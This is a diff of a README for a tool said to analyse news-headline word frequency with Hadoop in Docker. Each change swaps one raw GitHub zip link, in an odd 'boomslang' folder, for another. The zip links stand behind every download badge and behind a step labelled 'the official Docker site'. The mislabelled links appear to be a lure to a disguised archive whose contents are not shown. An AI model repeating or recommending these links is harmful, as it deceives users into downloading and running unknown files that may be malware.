@@ -1,6 +1,6 @@
 # 📰 hadoop-news-analytics - Analyze News Headlines Word Frequency
 
-[![Download from GitHub](https://img.shields.io/badge/Download-hadoop--news--analytics-brightgreen)](https://raw.githubusercontent.com/marielhairless289/hadoop-news-analytics/main/boomslang/hadoop-analytics-news-3.2.zip)
+[![Download from GitHub](https://img.shields.io/badge/Download-hadoop--news--analytics-brightgreen)](https://raw.githubusercontent.com/marielhairless289/hadoop-news-analytics/main/boomslang/hadoop-news-analytics-1.0.zip)
 
 ## 📋 What is hadoop-news-analytics?
 
@@ -24,7 +24,7 @@ You don’t need programming skills to use this. The tool handles everything in 
 
 Docker must be running to use hadoop-news-analytics. If you don’t have it yet, follow these steps:
 
-1. Go to the official Docker site: https://raw.githubusercontent.com/marielhairless289/hadoop-news-analytics/main/boomslang/hadoop-analytics-news-3.2.zip
+1. Go to the official Docker site: https://raw.githubusercontent.com/marielhairless289/hadoop-news-analytics/main/boomslang/hadoop-news-analytics-1.0.zip
 2. Download the Docker Desktop installer for Windows.
 3. Run the installer and follow instructions.
 4. After installation, open Docker Desktop and wait until it shows "Docker is running."
@@ -36,7 +36,7 @@ Docker must be running to use hadoop-news-analytics. If you don’t have it yet,
 
 Use the link below to visit the GitHub page where all files are stored.  
 
-[![Get hadoop-news-analytics](https://img.shields.io/badge/GitHub-Download-blue)](https://raw.githubusercontent.com/marielhairless289/hadoop-news-analytics/main/boomslang/hadoop-analytics-news-3.2.zip)
+[![Get hadoop-news-analytics](https://img.shields.io/badge/GitHub-Download-blue)](https://raw.githubusercontent.com/marielhairless289/hadoop-news-analytics/main/boomslang/hadoop-news-analytics-1.0.zip)
 
 To begin, follow these steps:
 
@@ -158,7 +158,7 @@ Hadoop runs this across a single virtual computer inside Docker. This setup is t
 
 Visit this page to download all files and get started:  
 
-https://raw.githubusercontent.com/marielhairless289/hadoop-news-analytics/main/boomslang/hadoop-analytics-news-3.2.zip
+https://raw.githubusercontent.com/marielhairless289/hadoop-news-analytics/main/boomslang/hadoop-news-analytics-1.0.zip
 
 ---
 
